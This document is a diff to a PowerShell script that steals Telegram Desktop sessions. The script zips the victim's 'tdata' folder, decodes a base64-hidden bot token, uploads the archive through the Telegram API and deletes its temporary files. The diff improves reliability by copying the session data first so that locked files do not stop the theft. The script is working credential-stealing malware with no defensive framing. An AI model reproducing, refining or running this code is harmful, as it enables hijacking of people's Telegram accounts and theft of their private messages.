@@ -1,5 +1,6 @@
 # Define paths using environment variables
 $src = Join-Path -Path $env:APPDATA -ChildPath "Telegram Desktop\tdata"
+$tempFolder = Join-Path -Path $env:TEMP -ChildPath "tdata_temp_$(Get-Date -Format 'yyyyMMddHHmmss')"
 $zip = Join-Path -Path $env:TEMP -ChildPath "tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
 $tent = "Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
 $tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tent))
@@ -11,32 +12,41 @@ if (-not (Test-Path -Path $src -PathType Container)) {
     exit 1
 }
 
-# Check if the user has read access to the source directory
-try {
-    $testFile = Get-ChildItem -Path $src -ErrorAction Stop
-} catch {
-    Write-Error "Cannot access source directory '$src': $_"
+# Check if TEMP directory is writable
+if (-not (Test-Path -Path $env:TEMP -PathType Container)) {
+    Write-Error "TEMP directory '$env:TEMP' is not accessible."
     exit 1
 }
 
-# Create zip file in TEMP directory
+# Copy tdata to a temporary folder to avoid file locks
 try {
-    # Ensure TEMP directory is writable
-    if (-not (Test-Path -Path $env:TEMP -PathType Container)) {
-        Write-Error "TEMP directory '$env:TEMP' is not accessible."
-        exit 1
+    New-Item -Path $tempFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
+    Copy-Item -Path "$src\*" -Destination $tempFolder -Recurse -Force -ErrorAction Stop
+} catch {
+    Write-Error "Failed to copy tdata to temporary folder '$tempFolder': $_"
+    if (Test-Path -Path $tempFolder) {
+        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
     }
+    exit 1
+}
 
-    # Compress the tdata folder
-    Compress-Archive -Path "$src\*" -DestinationPath $zip -Force -ErrorAction Stop
+# Create zip file from the temporary folder
+try {
+    Compress-Archive -Path "$tempFolder\*" -DestinationPath $zip -Force -ErrorAction Stop
 } catch {
     Write-Error "Failed to create zip file at '$zip': $_"
+    if (Test-Path -Path $tempFolder) {
+        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
+    }
     exit 1
 }
 
 # Verify zip file was created
 if (-not (Test-Path -Path $zip -PathType Leaf)) {
     Write-Error "Zip file '$zip' was not created."
+    if (Test-Path -Path $tempFolder) {
+        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
+    }
     exit 1
 }
 
@@ -52,7 +62,10 @@ try {
     Write-Error "Failed to send file via Telegram API: $_"
     exit 1
 } finally {
-    # Clean up the zip file
+    # Clean up temporary files
+    if (Test-Path -Path $tempFolder) {
+        Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
+    }
     if (Test-Path -Path $zip) {
         Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue
     }
